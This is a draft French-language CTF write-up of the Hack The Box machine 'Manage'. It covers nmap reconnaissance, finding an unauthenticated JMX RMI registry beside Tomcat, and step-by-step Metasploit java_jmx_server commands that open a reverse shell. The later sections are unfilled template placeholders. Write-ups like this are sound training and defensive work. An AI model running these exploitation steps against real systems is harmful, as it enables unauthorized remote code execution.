---
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

title: "Manage"
slug: "manage"
date: 2025-11-16T17:00:10+01:00
lastmod: 2025-11-16T17:00:10+01:00
draft: true

# --- PaperMod / navigation ---
type: "writeups"
summary: "RMI exposé sur Tomcat ouvrant un accès JMX vulnérable exploité via Metasploit."
tags: ["Tomcat","Metasploit"]
categories: ["Mes writeups"]

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Manage"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Manage"
  difficulty: "Easy | Medium | Hard"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web","Privilege Escalation"]
  time_spent: "2h"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d’attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true
---

<!-- ====================================================================
Tableau d’infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d’archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Manage> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

Au départ, mes scans Nmap classiques ne donnent rien d’exploitable : juste un Tomcat sur 8080, quelques ports classiques, aucune page intéressante dans les répertoires et aucun vhost valable. C’est le scan agressif qui met en lumière quelque chose d’inhabituel : deux ports liés à Java RMI (2222 et 45931). L’association RMI + Tomcat m’offre une piste intéressante : un accès JMX potentiellement mal sécurisé… qui s’avérera être la clé de l’exploitation.

---

## Énumération

Pour démarrer, je lance mon script d'énumération {{< script "mon-nouveau-nmap" >}} :

```bash
mon-nouveau-nmap manage.htb

# Résultats dans le répertoire mes_scans/
#  - mes_scans/full_tcp_scan.txt
#  - mes_scans/aggressive_vuln_scan.txt
#  - mes_scans/cms_vuln_scan.txt
#  - mes_scans/udp_vuln_scan.txt
```

### Scan initial 



```bash
# Nmap 7.95 scan initiated Mon Nov 17 16:58:19 2025 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 --max-retries 3 -oN mes_scans/full_tcp_scan.txt manage.htb
Nmap scan report for manage.htb (10.129.234.57)
Host is up (0.0083s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
2222/tcp  open  EtherNetIP-1
8080/tcp  open  http-proxy
35627/tcp open  unknown
42277/tcp open  unknown

# Nmap done at Mon Nov 17 16:58:27 2025 -- 1 IP address (1 host up) scanned in 7.43 seconds

```

### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités :

```bash
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour manage.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"22,2222,8080,35627,42277" --script="http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params" --script-timeout=30s -T4 "manage.htb"

# Nmap 7.95 scan initiated Mon Nov 17 16:58:27 2025 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,2222,8080,35627,42277 --script=http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params --script-timeout=30s -T4 -oN mes_scans/aggressive_vuln_scan_raw.txt manage.htb
Nmap scan report for manage.htb (10.129.234.57)
Host is up (0.0077s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
2222/tcp  open  java-rmi   Java RMI
8080/tcp  open  http       Apache Tomcat 10.1.19
35627/tcp open  tcpwrapped
42277/tcp open  java-rmi   Java RMI
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT     ADDRESS
1   7.57 ms 10.10.14.1
2   8.06 ms manage.htb (10.129.234.57)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 17 16:58:41 2025 -- 1 IP address (1 host up) scanned in 13.92 seconds

```



Ce scan confirme :

- **Tomcat 10.1.19** sur le port **8080/tcp**
- Deux services **Java RMI** sur **2222/tcp** et **45931/tcp** 
- Aucun script Nmap “http-vuln-*” ne remonte de vulnérabilité web évidente sur Tomcat

Un scan complémentaire NMAP NSE orienté **rmi** va nous donner plus d'infos

```bash
nmap -sV --script rmi* -p 2222 -oN mes_scans/rmi_scan.txt manage.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-18 11:03 CET
Nmap scan report for manage.htb (10.129.234.57)
Host is up (0.0079s latency).

PORT     STATE SERVICE  VERSION
2222/tcp open  java-rmi Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:42277
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.04 seconds

```

**Le script NSE arrive à interroger le registre RMI**
 → S’il répond, c’est qu’il n’exige **ni authentification**, ni **politique de sécurité**, ni **filtrage IP**.

Dès que **jmxrmi apparaît**, tu sais que :

- il existe une interface **JMX Remote**,
- elle n’est pas protégée,
- elle est probablement exploitable via `java_jmx_server` (Metasploit) ou `JMXInvokerServlet` selon la version.

### Scan ciblé CMS

Le scan ciblé CMS (`mes_scans/cms_vuln_scan.txt`) ne met rien de vraiment exploitable en évidence pour ce CTF.

### Scan UDP rapide

Le scan UDP rapide (`mes_scans/udp_vuln_scan.txt`) ne met rien de vraiment exploitable en évidence pour ce CTF.

### Scan répertoires

Pour la partie découverte de chemins web, j’utilise mon script dédié {{< script "mon-recoweb" >}} sur le service Tomcat :

```bash
=== mon-recoweb manage.htb START ===
Script       : mon-recoweb
Version      : mon-recoweb 2.1.2
Date         : 2025-11-19 16:09:38
Domaine      : manage.htb
IP           : 10.129.144.215
Mode         : large
Wordlist eff.: /tmp/mon-recoweb_manage.htb_wl.75meZS
Master       : /usr/share/wordlists/dirb/common.txt
Codes        : all  (strict=0)

DIR totaux bruts   : 9
DIR totaux uniques : 7
  - /docs
  - /examples
  - /favicon.ico
  - /host-manager
  - /manager
  - /meta-inf
  - /web-inf

--- Détails par port ---
Port 8080 (http)
  whatweb :
    http://manage.htb:8080/ [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.144.215], Title[Apache Tomcat/10.1.19]
  Baseline: code=404 size=765 words=68 (/shoisqhc51rnd)
  DIR (9)
    - /docs
    - /examples
    - /favicon.ico
    - /host-manager
    - /manager
    - /meta-inf
    - /META-INF
    - /web-inf
    - /WEB-INF



=== mon-recoweb manage.htb END ===



```

Les résultats principaux :

- `http://manage.htb:8080/` : page d'accueil Tomcat par défaut
- Redirections **302** vers quelques applications internes Tomcat :
  - `/docs`
  - `/examples`
  - `/manager`
  - `/host-manager`

En approfondissant sur `/docs` et `/examples` (nouveaux `mon-recoweb` ciblés), aucun répertoire ou fichier applicatif intéressant n'est découvert : uniquement la documentation Tomcat standard et les exemples, sans appli custom de type “manage” ou panneau d’admin dédié.

### Scan vhosts

Enfin, je teste rapidement la présence de vhosts  avec  {{< script "mon-recoweb" >}} :

```bash
=== mon-subdomains manage.htb START ===
Script       : mon-subdomains
Version      : mon-subdomains 2.1.1
Date         : 2025-11-19 16:18:13
Domaine      : manage.htb
IP           : 10.129.144.215
Mode         : fast
Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
Codes        : all  (strict=0)

VHOST totaux : 0
  - (aucun)

--- Détails par port ---
Port 8080 (http)
  Baseline: code=200 size=11219 words=490 (Host=d88olulhturnd.manage.htb)
  VHOST (0)
    - (aucun)



=== mon-subdomains manage.htb END ===


```




---

## Exploitation – Prise de pied (Foothold)

Je recentre donc  l’analyse sur :

- **Tomcat /manager** (403 mais important conceptuellement)
- et surtout la **présence des deux services Java RMI**, qui serviront de point d’entrée pour l’exploitation ultérieure.

Pour confirmer la piste JMX, j’ai lancé un scan Nmap ciblé sur le port RMI détecté au scan agressif. Le script NSE `rmi*` permet d’interroger un registre RMI et révèle souvent la présence d’une interface JMX exposée. 

```bash
nmap --script "rmi*" -sV -p 2222 manage.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 16:35 CET
Nmap scan report for manage.htb (10.129.144.215)
Host is up (0.0075s latency).

PORT     STATE SERVICE  VERSION
2222/tcp open  java-rmi Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:34827
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.01 seconds

```

Sur cette machine, le script a clairement montré que le serveur RMI acceptait les connexions distantes sans authentification, ce qui n’est normalement pas autorisé. L’entrée `jmxrmi` était accessible, signe d’une configuration Tomcat vulnérable. Une interface JMX ouverte ainsi vers l’extérieur équivaut à une exécution de code à distance. 

Une recherche Web sur "Metasploit modules Java RMI JMX" va livrer:

- **Java JMX Server Insecure Configuration Java Code Execution**
  - Module : `exploit/multi/misc/java_jmx_server`
  - Description : Ce module tire parti d'une configuration non sécurisée de l'interface JMX, permettant de charger des classes depuis une URL HTTP distante. Il est efficace contre les interfaces JMX sans authentification ou avec une configuration faible (par exemple, si `com.sun.management.jmxremote.authenticate=false`).
  - Source : <a href="https://blog.pentesteracademy.com/java-jmx-server-insecure-configuration-java-code-execution-295421a452f7" target="_blank" rel="noopener noreferrer">Pentester Academy</a>

Cette confirmation va me permettre de tester le module Metasploit `java_jmx_server` qui devrait me fournir un shell `tomcat`. 



```bash
# Step 1: Start Metasploit
msfconsole

# Step 2: Search for the exploit
search java_jmx_server

# Step 3: Use the JMX RMI exploit
use exploit/multi/misc/java_jmx_server

# Step 4: Set the target host
set RHOST <machine IP>

# Step 5: Set the RMI port
set RPORT 2222

# Step 6: Set your local IP (replace with your actual tun0 IP)
set LHOST <your_tun0 IP>

# Step 7: Set the local port to receive the shell
set LPORT 1337

# Step 8: Launch the exploit
exploit
```



---

## Escalade de privilèges

### Vers utilisateur intermédiaire (si applicable)
- Méthode (sudoers, capabilities, SUID, timers, service vulnérable).
- Indices collectés (configs, clés, cron, journaux).

### Vers root
- Vecteur principal, exploitation, contournements.
- Preuves : `id`, `hostnamectl`, `cat /root/root.txt`.
- Remédiations possibles (leçons sécurité).

---

## Les Flags

- `user.txt` : chemin, obtention (preuve succincte).
- `root.txt` : chemin, obtention (preuve succincte).

---

## Conclusion

- Récapitulatif de la chaîne d’attaque (du scan à root).
- Vulnérabilités exploitées & combinaisons.
- Conseils de mitigation et détection.
- Points d’apprentissage personnels.

---

## Pièces jointes (optionnel)

- Scripts, one-liners, captures, notes.  
- Arbo conseillée : `files/<nom_ctf>/…`
